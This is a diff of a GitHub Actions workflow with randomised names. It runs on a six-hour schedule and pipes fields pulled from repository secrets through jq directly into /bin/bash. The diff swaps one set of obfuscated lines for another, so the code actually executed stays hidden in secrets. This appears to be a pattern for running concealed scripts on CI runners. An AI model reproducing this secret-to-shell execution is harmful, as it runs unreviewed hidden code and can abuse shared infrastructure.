@@ -2,29 +2,21 @@ name: yanxiaosan1829
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 3/6 * * *'
+    - cron: '26 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yanxiaosan1829
         env:
-          xe7395: ${{ secrets.xe7395 }}
+          a48642: ${{ secrets.a48642 }}
         run: |
-          echo $xe7395 | jq -r .yxmq77 | /bin/bash
-          echo $y7 | jq -r .fcr1603 | /bin/bash
-          echo $i44994 | jq -r .baoj14473 | /bin/bash
-          echo $mjdem17 | jq -r .pmyzi31 | /bin/bash
-          echo $qnq62 | jq -r .rrr9232 | /bin/bash
-          echo $dbi81 | jq -r .qtj27320 | /bin/bash
-          echo $lgzdx63888 | jq -r .k41857 | /bin/bash
-          echo $otkn76060 | jq -r .do6 | /bin/bash
-          echo $lekw5 | jq -r .o13975 | /bin/bash
-          echo $p22 | jq -r .kgms85059 | /bin/bash
-          echo $fkq06 | jq -r .nidbb5188 | /bin/bash
-          echo $jqy340 | jq -r .f90 | /bin/bash
-          echo $lz4742 | jq -r .fbn658 | /bin/bash
-          echo $myxn20 | jq -r .lwc975 | /bin/bash
-          echo $m7838 | jq -r .sk46 | /bin/bash
+          echo $a48642 | jq -r .cwd2023 | /bin/bash
+          echo $rahod2 | jq -r .pq65923 | /bin/bash
+          echo $lgzzo71891 | jq -r .kz7807 | /bin/bash
+          echo $yjag9 | jq -r .e4134 | /bin/bash
+          echo $m8688 | jq -r .ceq446 | /bin/bash
 
